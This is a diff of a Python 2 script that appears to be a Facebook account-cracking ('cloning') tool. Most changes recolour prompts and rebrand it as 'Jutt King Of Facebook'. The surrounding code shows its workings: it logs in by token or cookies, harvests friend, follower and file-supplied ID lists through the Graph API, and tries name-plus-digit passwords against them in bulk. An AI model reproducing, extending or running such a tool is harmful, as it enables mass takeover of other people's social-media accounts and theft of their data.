@@ -182,7 +182,7 @@ def log_menu():
         print logo
         print '\033[1;97m ~~~~ Login menu ~~~~\033[1;91m'
         print 47 * '-'
-        print '\033[1;96m[1] Login with FaceBook'
+        print '\033[1;96m[1] Login with Email Pass'
         print '\033[1;96m[2] Login with token'
         print '\033[1;96m[3] Login with cookies'
         print ''
@@ -334,12 +334,11 @@ def menu():
     print '\033[1;96m[3] Crack with Name + Number password'
     print '\033[1;96m[4] Extract File'
     print '\033[1;96m[5] Logout'
-    print '\033[1;96m[6] Delete trash files'
     menu_s()
 
 
 def menu_s():
-    ms = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80jutt\xe2\x9e\xa4 ')
+    ms = raw_input('\033[1;97m>>>Select ')
     if ms == '1':
         auto_crack()
     elif ms == '2':
@@ -366,19 +365,19 @@ def crack():
     except (KeyError, IOError):
         os.system('clear')
         print logo
-        print '\t File Not Found \x1b[0;97m'
+        print '\t File Not Found \033[0;97m'
         print ''
         time.sleep(1)
         log_menu()
 
     os.system('clear')
     print logo
-    print '\x1b[1;93m~~~~ Auto pass cracking ~~~~\x1b[1;91m'
+    print '\033[1;97m~~~~ Auto pass cracking ~~~~\033[1;91m'
     print 47 * '-'
-    print '\x1b[1;92m[1] Public id cloning'
-    print '\x1b[1;92m[2] Followers cloning'
-    print '\x1b[1;92m[3] File cloning'
-    print '\x1b[1;92m[0] Back'
+    print '\033[1;96m[1] Public id cloning'
+    print '\033[1;96m[2] Followers cloning'
+    print '\033[1;96m[3] File cloning'
+    print '\033[1;96m[0] Back'
     a_s()
 
 
@@ -389,19 +388,19 @@ def auto_crack():
     except (KeyError, IOError):
         os.system('clear')
         print logo
-        print '\t Login FB id to continue\x1b[0;97m'
+        print '\t Login FB id to continue\033[0;97m'
         print ''
         time.sleep(1)
         log_menu()
 
     os.system('clear')
     print logo
-    print '\x1b[1;93m~~~~ Auto pass cracking ~~~~\x1b[1;91m'
+    print '\033[1;97m~~~~ Auto pass cracking ~~~~\033[1;91m'
     print 47 * '-'
-    print '\x1b[1;92m[1] Public id cloning'
-    print '\x1b[1;92m[2] Followers cloning'
-    print '\x1b[1;92m[3] File cloning'
-    print '\x1b[1;92m[B] Back'
+    print '\033[1;96m[1] Public id cloning'
+    print '\x1b[1;96m[2] Followers cloning'
+    print '\x1b[1;96m[3] File cloning'
+    print '\033[1;96m[B] Back'
     a_s()
 
 
@@ -409,24 +408,24 @@ def a_s():
     id = []
     cps = []
     oks = []
-    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80jutt\xe2\x9e\xa4 ')
+    a_s = raw_input(' \033[1;97m>>>Enter ')
     if a_s == '1':
         os.system('clear')
         print logo
-        print '\x1b[1;93m~~~~ Auto pass public cracking ~~~~\x1b[1;91m'
+        print '\033[1;97m~~~~ Auto pass public cracking ~~~~\033[1;91m'
         print 47 * '-'
-        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
+        idt = raw_input(' \033[1;97m>>>Enter id: ')
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
             q = json.loads(r.text)
             z = q['name']
             os.system('clear')
             print logo
-            print '\x1b[1;93m~~~~Auto pass public cracking~~~~'
-            print ' \x1b[1;92mCloning from: ' + z
+            print '\033[1;97m~~~~Auto pass public cracking~~~~'
+            print ' \033[1;96mCloning from: ' + z
         except (KeyError, IOError):
-            print '\t Invalid user \x1b[0;97m'
-            raw_input(' \x1b[1;92mPress enter to try again ')
+            print '\t Invalid user \033[0;97m'
+            raw_input(' \033[1;93mPress enter to try again ')
             auto_crack()
 
         r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
@@ -440,26 +439,26 @@ def a_s():
     elif a_s == '2':
         os.system('clear')
         print logo
-        print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~\x1b[1;91m'
+        print '\033[1;97m~~~~ Name pass followers cracking ~~~~\033[1;91m'
         print 47 * '-'
-        print ' \x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
+        print ' \033[1;97mFor example:123,1234,12345,786,12,1122\033[1;91m'
         print 47 * '-'
-        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
-        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
-        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
-        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
-        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
+        p1 = raw_input(' \033[1;96m[1]Name + digit: ')
+        p2 = raw_input(' \033[1;96m[2]Name + digit: ')
+        p3 = raw_input(' \033[1;96m[3]Name + digit: ')
+        p4 = raw_input(' \033[1;96m[4]Name + digit: ')
+        idt = raw_input(' \033[1;93m>>>Enter id: ')
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
             q = json.loads(r.text)
             z = q['name']
             os.system('clear')
             print logo
-            print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~'
-            print ' \x1b[1;92mCloning from: ' + z
+            print '\033[1;97m~~~~ Name pass followers cracking ~~~~'
+            print ' \033[1;96mCloning from: ' + z
         except (KeyError, IOError):
-            print '\t Invalid user \x1b[0;97m'
-            raw_input('\x1b[1;92mPress enter to try again ')
+            print '\t Invalid user \033[0;97m'
+            raw_input('\033[1;93mPress enter to try again ')
             auto_crack()
 
         r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
@@ -473,7 +472,7 @@ def a_s():
     elif a_s == '3':
         os.system('clear')
         print logo
-        print '\x1b[1;93m~~~~ Auto pass File cracking ~~~~\x1b[1;91m'
+        print '\033[1;97m~~~~ Auto pass File cracking ~~~~\033[1;91m'
         print 47 * '-'
         try:
             idlist = raw_input('[+] File Name: ')
@@ -493,10 +492,10 @@ def a_s():
         a_s()
     print ' Total ids: ' + str(len(id))
     time.sleep(0.5)
-    print ' \x1b[1;97mCrack Running\x1b[1;91m '
+    print ' \033[1;97mJutt Badshah Start Cloning\033[1;91m '
     time.sleep(0.5)
     print 47 * '-'
-    print '\t\x1b[1;94mJutt King Of Facebook\x1b[1;91m'
+    print '\033[1;96mJutt King Of Facebook\033[1;91m'
     print 47 * '-'
 
     def main(arg):
